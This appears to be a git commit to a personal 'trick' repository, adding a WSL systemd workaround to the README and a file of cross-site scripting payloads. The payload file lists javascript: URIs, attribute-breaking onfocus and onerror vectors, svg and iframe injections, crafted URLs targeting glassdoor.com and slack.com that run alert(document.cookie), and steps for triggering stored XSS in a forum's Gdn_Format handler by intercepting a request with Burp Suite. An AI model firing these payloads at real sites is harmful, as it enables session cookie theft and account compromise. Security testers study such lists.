c7ee48a90ef49bdbedf8d24ad538fcda78f2602c
NA <plna@users.noreply.github.com>
2020-08-03 23:00:21 +0700

    update

--- README.md
+++ README.md
@@ -1,2 +1,7 @@
 # trick
  scripts and tricks
+
+WSL Snap fix:
+sudo apt-get update && sudo apt-get install -yqq daemonize dbus-user-session fontconfig
+sudo daemonize /usr/bin/unshare --fork --pid --mount-proc /lib/systemd/systemd --system-unit=basic.target
+exec sudo nsenter -t $(pidof systemd) -a su - $LOGNAME
---
+++ js-payload/js-101.js
@@ -0,0 +1,63 @@
+
+
+
+
+// url
+');javascript:alert('DDD
+https://xss-game.appspot.com/level4/frame');javascript:alert('DDD
+//url
+#'onerror='alert()'
+// scheame href="javascript:alert(document.domain)"
+javascript:alert(document.domain)
+href="javascript:alert(document.domain)"
+<a href="javascript:alert(document.domain)">javascript:alert(document.domain)</a> 
+//
+// value=""
+" onfocus=alert(document.domain) 
+// value=""
+"onclick=alert(document.domain);"
+// value=""
+" onfocus="alert(document.domain)" autofocus="
+// value=""
+" onfocus="alert(document.domain)"          "
+//
+<script>alert(document.domain)</script>
+// Time
+/?xss=500); alert(document.cookie);          //
+//
+<svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+//
+https://www.glassdoor.com/employers/sem-dual-lp/?utm_source=abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e 
+//
+<iframe srcdoc="<img src=x onerror=alert(document.domain)>"></iframe>
+
+///
+/><svg src=x onload=confirm(document.domain);>       
+
+///////
+"><img src=x onerror=alert(document.domain)>
+
+//"
+
+https://slack.com/is#?cvo_sid1=111/u0026;typ=55577%5D%22)%3balert(document.cookie)%3b//
+
+
+//
+
+
+public static function to($mixed, $formatMethod) {
+    // Process $Mixed based on its type.
+    if (is_string($mixed)) {
+        if (in_array(strtolower($formatMethod), self::$SanitizedFormats) && method_exists('Gdn_Format', $formatMethod)) {
+            $mixed = self::$formatMethod($mixed);
+        } elseif (function_exists('format'.$formatMethod)) {
+            deprecated('format'.$formatMethod, 'gdn_formatter_'.$formatMethod, '2015-10-26');
+            $formatMethod = 'format'.$formatMethod;
+
+
+Log in and Click New Discussion
+set content as x<img src=x onerror=alert(document.cookie)>x
+Post Discussion and Intercept request with Burpsuite
+Modify the param Format as String
+the the XSS vector will be triggered
+        
